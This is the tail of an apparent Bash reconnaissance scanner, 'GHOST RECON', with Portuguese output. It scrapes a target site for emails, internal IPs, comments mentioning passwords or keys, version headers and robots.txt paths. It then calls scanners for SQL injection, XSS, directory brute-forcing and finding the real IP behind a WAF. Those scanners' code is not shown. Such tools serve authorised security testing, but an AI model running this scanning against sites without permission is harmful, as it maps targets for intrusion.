    HOP_IP=$(echo "$line" | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
    if [ -n "$HOP_IP" ]; then
      GEO=$(curl -s --max-time 2 "http://ip-api.com/json/$HOP_IP?fields=country,city,isp" 2>/dev/null)
      COUNTRY=$(echo $GEO | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
      CITY=$(echo $GEO | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
      [ -n "$COUNTRY" ] && subinfo "$line ${CYAN}[$COUNTRY/$CITY]${NC}" || subinfo "$line"
    else
      subinfo "$line"
    fi
  done
}

# ================================================================
#  [22] SENSITIVE DATA EXPOSURE
# ================================================================

sensitive_data() {
  section "🔐 [22] SENSITIVE DATA EXPOSURE"

  info "Verificando exposição de dados sensíveis no HTML..."
  PAGE=$(curl -sk --max-time 10 "$FULL_URL" 2>/dev/null)

  # Emails
  EMAILS=$(echo "$PAGE" | grep -oiE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u | head -10)
  [ -n "$EMAILS" ] && found "Emails encontrados no HTML:" && echo "$EMAILS" | while read e; do subinfo "$e"; done

  # IPs internos
  INTERNAL=$(echo "$PAGE" | grep -oE '(10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[01])\.[0-9]+\.[0-9]+|192\.168\.[0-9]+\.[0-9]+)' | sort -u | head -5)
  [ -n "$INTERNAL" ] && found "IPs internos expostos no HTML:" && echo "$INTERNAL" | while read ip; do subinfo "$ip"; done

  # Comentários HTML com info sensível
  COMMENTS=$(echo "$PAGE" | grep -oiE '<!--[^-]*-->' | grep -iE "password|secret|key|todo|fix|hack|bug|admin|test|debug|database|server|config" | head -5)
  [ -n "$COMMENTS" ] && found "Comentários HTML suspeitos:" && echo "$COMMENTS" | while read c; do subinfo "$c"; done

  # Verificar exposição de versão
  VER=$(curl -sI --max-time 5 "$FULL_URL" 2>/dev/null | grep -iE "^Server:|^X-Powered-By:|^X-Generator:" | head -3)
  [ -n "$VER" ] && warn "Versão de software exposta nos headers:" && echo "$VER" | while read v; do subinfo "$v"; done

  # robots.txt - caminhos escondidos
  ROBOTS=$(curl -sk --max-time 5 "$FULL_URL/robots.txt" 2>/dev/null)
  if [ -n "$ROBOTS" ]; then
    info "robots.txt encontrado — caminhos disallowed:"
    echo "$ROBOTS" | grep -i "Disallow" | while read r; do
      PATH_R=$(echo "$r" | awk '{print $2}')
      [ -n "$PATH_R" ] && url_found "$FULL_URL$PATH_R"
    done
  fi

  # security.txt
  for f in "/.well-known/security.txt" "/security.txt"; do
    C=$(curl -sk --max-time 5 "$FULL_URL$f" 2>/dev/null)
    [ -n "$C" ] && info "security.txt encontrado:" && echo "$C" | head -10 | while read l; do subinfo "$l"; done
  done
}

# ================================================================
#  RELATÓRIO FINAL
# ================================================================

final_report() {
  echo -e "\n\n${WHITE}╔════════════════════════════════════════════════════════════════╗${NC}"
  echo -e "${WHITE}╠════════════════════════════════════════════════════════════════╣${NC}"
  echo -e "${WHITE}║${NC}  ${BOLD}${RED}        ⚡  GHOST RECON v4.0 — RELATÓRIO FINAL  ⚡${NC}          ${WHITE}║${NC}"
  echo -e "${WHITE}╠════════════════════════════════════════════════════════════════╣${NC}"
  echo -e "${WHITE}║${NC}  ${CYAN}Alvo:${NC}          ${YELLOW}$DOMAIN${NC}"
  echo -e "${WHITE}║${NC}  ${CYAN}IP Principal:${NC}  ${RED}$MAIN_IP${NC}"
  echo -e "${WHITE}║${NC}  ${CYAN}IPs IPv4:${NC}      $(echo $IPV4 | tr '\n' ' ')"
  echo -e "${WHITE}║${NC}  ${CYAN}Portas DB:${NC}     ${RED}${OPEN_DB_PORTS[*]:-nenhuma detectada}${NC}"
  echo -e "${WHITE}╠════════════════════════════════════════════════════════════════╣${NC}"

  if [ "$VULN_COUNT" -gt 0 ]; then
    echo -e "${WHITE}║${NC}  ${BG_RED}${WHITE}  ⚠  $VULN_COUNT VULNERABILIDADES ENCONTRADAS  ⚠  ${NC}"
  else
    echo -e "${WHITE}║${NC}  ${BG_GREEN}${WHITE}  ✓  Nenhuma vulnerabilidade crítica encontrada  ${NC}"
  fi

  echo -e "${WHITE}╠════════════════════════════════════════════════════════════════╣${NC}"

  if [ ${#ALL_URLS_FOUND[@]} -gt 0 ]; then
    echo -e "${WHITE}║${NC}  ${PURPLE}${BOLD}URLs/Endpoints Encontrados (${#ALL_URLS_FOUND[@]}):${NC}"
    for url in "${ALL_URLS_FOUND[@]}"; do
      echo -e "${WHITE}║${NC}    ${CYAN}→ $url${NC}"
    done
    echo -e "${WHITE}║${NC}"
  fi

  echo -e "${WHITE}╠════════════════════════════════════════════════════════════════╣${NC}"
  echo -e "${WHITE}║${NC}  ${GREEN}Log completo:${NC} ${CYAN}$LOG_FILE${NC}"
  echo -e "${WHITE}║${NC}  ${GREEN}Data/Hora:${NC}    $(date '+%d/%m/%Y %H:%M:%S')"
  echo -e "${WHITE}╚════════════════════════════════════════════════════════════════╝${NC}"
  echo ""
  echo -e "${YELLOW}⚠  Use apenas em sistemas com permissão. Fins educacionais/defensivos.${NC}"
}

# ================================================================
#  MAIN
# ================================================================

banner

if [ -z "$1" ]; then
  echo -e "${YELLOW}Uso: bash ghostrecon.sh <site>${NC}"
  echo -e "Ex:  ${GREEN}bash ghostrecon.sh alvo.com${NC}\n"
  read -p "$(echo -e "${CYAN}Digite o alvo: ${NC}")" INPUT
  TARGET="$INPUT"
else
  TARGET="$1"
fi

[ -z "$TARGET" ] && echo -e "${RED}[!] Nenhum alvo.${NC}" && exit 1

check_deps
resolve_target "$TARGET"

detect_cdn_waf
find_real_ip
full_dns
whois_info
geoip_info
http_tech
ssl_info
db_port_scanner
web_db_panels
file_vuln_scanner
dir_brute
sqli_scanner
xss_scanner
cors_check
open_redirect
cms_vuln_scan
api_key_leak
subdomains_scan
reverse_ip
email_osint
traceroute_geo
sensitive_data

final_report
